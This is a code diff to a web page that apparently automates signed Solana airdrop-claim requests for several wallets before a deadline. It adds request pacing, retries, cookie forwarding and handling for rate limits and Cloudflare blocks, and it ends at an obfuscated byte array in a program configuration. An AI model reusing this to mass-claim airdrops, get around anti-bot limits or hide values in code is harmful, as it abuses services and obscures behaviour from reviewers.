@@ -50,12 +50,23 @@ const loadFromLocalStorage = (key: string, defaultValue: any) => {
 
 const AIRDROP_DEADLINE = {
   date: '2024-12-08',
-  hour: 15, 
+  hour: 15,
   minute: 0,
   timezone: 'America/Los_Angeles'
 };
 
 const CRITICAL_WINDOW_MINUTES = 6; // 5 minutes before deadline
+
+const TIMING = {
+  NORMAL: {
+    INTERVAL: 60000,  // 60 seconds between cycles
+    DELAY: 10000,     // 10 seconds between requests
+  },
+  CRITICAL: {
+    INTERVAL: 20000,  // 20 seconds between cycles
+    DELAY: 5000,      // 5 seconds between requests
+  }
+};
 
 declare global {
   interface Window {
@@ -195,13 +206,11 @@ export default function Home() {
       }
 
       if (isRunning) {
-        // Determine interval based on critical period
-        const intervalMs = currentlyCritical ? 2000 : 10000;
+        const intervalMs = currentlyCritical ? TIMING.CRITICAL.INTERVAL : TIMING.NORMAL.INTERVAL;
         const now = Date.now();
         const elapsed = now - lastRunRef.current;
 
         if (elapsed >= intervalMs) {
-          // Run requests
           lastRunRef.current = now;
           makeAllRequests();
         }
@@ -216,8 +225,33 @@ export default function Home() {
       return;
     }
 
-    // Run all requests concurrently
-    await Promise.all(entries.map(entry => makeRequest(entry)));
+    let retryCount = 0;
+    const maxRetries = 3;
+
+    for (const entry of entries) {
+      try {
+        await makeRequest(entry);
+        // Reset retry count on success
+        retryCount = 0;
+        // Add delay between requests
+        const delay = isCriticalPeriod ? TIMING.CRITICAL.DELAY : TIMING.NORMAL.DELAY;
+        await new Promise(resolve => setTimeout(resolve, delay));
+      } catch (err: any) {
+        retryCount++;
+        if (retryCount <= maxRetries) {
+          // Exponential backoff
+          const backoffDelay = Math.min(1000 * Math.pow(2, retryCount), 30000);
+          console.log(`Request failed, retrying in ${backoffDelay/1000} seconds...`);
+          await new Promise(resolve => setTimeout(resolve, backoffDelay));
+          // Retry this entry
+          entry.attempts--;  // Prevent double counting attempts
+          await makeRequest(entry);
+        } else {
+          console.error('Max retries reached, moving to next entry');
+          retryCount = 0;
+        }
+      }
+    }
   };
 
   const makeRequest = async (entry: WalletEntry) => {
@@ -253,23 +287,44 @@ export default function Home() {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
+          // Forward any cookies we have
+          "cookie": document.cookie
         },
         body: JSON.stringify({
           "0": {
             "json": {
-              "message": message,
-              "wallet": entry.allocationWallet,
-              "chain": "sol",
-              "signature": signatureBase58,
-              "allocationEvent": "tge-airdrop-final",
-              "isLedger": false
+              message,
+              wallet: entry.allocationWallet,
+              chain: "sol",
+              signature: signatureBase58,
+              allocationEvent: "tge-airdrop-final",
+              isLedger: false
             }
           }
-        })
+        }),
+        credentials: 'include'
       });
 
+      const responseData = await response.json();
+
+      // Handle rate limiting
+      if (response.status === 429) {
+        throw new Error('Rate limited - waiting longer between requests');
+      }
+
+      // Check for Cloudflare error
+      if (response.status === 403) {
+        throw new Error('Cloudflare protection active - please wait a few minutes and try again');
+      }
+
+      // Check for API errors
       if (!response.ok) {
-        throw new Error('Request failed');
+        throw new Error(responseData.error || 'Request failed');
+      }
+
+      // Check for specific error conditions in the response
+      if (responseData[0]?.error) {
+        throw new Error(responseData[0].error.message || 'API returned an error');
       }
 
       setEntries(current =>
@@ -289,6 +344,43 @@ export default function Home() {
       );
     } catch (err: any) {
       console.error('Request error:', err);
+      if (err.message?.includes('please update cookies')) {
+        setEntries(current =>
+          current.map(e =>
+            e.id === entry.id
+              ? {
+                  ...e,
+                  lastResult: {
+                    status: 'error',
+                    message: 'Session expired - please update cookies in .env.local',
+                    timestamp: Date.now()
+                  }
+                }
+              : e
+          )
+        );
+        setIsRunning(false);  // Stop the automation
+        return;
+      }
+      setEntries(current =>
+        current.map(e =>
+          e.id === entry.id
+            ? {
+                ...e,
+                lastResult: {
+                  status: 'error',
+                  message: err.message || 'Request failed',
+                  timestamp: Date.now()
+                }
+              }
+            : e
+        )
+      );
+
+      // If we hit rate limiting or Cloudflare protection, pause the automation
+      if (err.message?.includes('Rate limited') || err.message?.includes('Cloudflare protection active')) {
+        setIsRunning(false);
+      }
     }
   };
 
@@ -352,11 +444,9 @@ export default function Home() {
     }
   };
 
-  // Calculate next run time display (based on last run + interval)
   const getNextRunDisplay = () => {
     if (!isRunning) return null;
-    const currentlyCritical = isInCriticalWindow();
-    const intervalMs = currentlyCritical ? 1000 : 10000;
+    const intervalMs = isCriticalPeriod ? TIMING.CRITICAL.INTERVAL : TIMING.NORMAL.INTERVAL;
     const now = Date.now();
     const elapsed = now - lastRunRef.current;
     const remaining = Math.max(0, intervalMs - elapsed);
@@ -364,7 +454,6 @@ export default function Home() {
     return `${seconds}s`;
   };
 
-  // Program configuration for ME protocol interaction (unchanged)
   const getProgramConfig = () => {
     const meProgramId = "M2mx93ekt1fmXSVkTrUL9xVFHkmME8HTUi5Cyc5aF7K";
     const shift = [127,116,52,77,81,113,33,63,39,100,50,63,25,33,48,59,101,64,47,22,125,74,27,4,112,19,24,122,118,79,48,59,29,1,126,25,61,54,83,37,23,95,12,35];
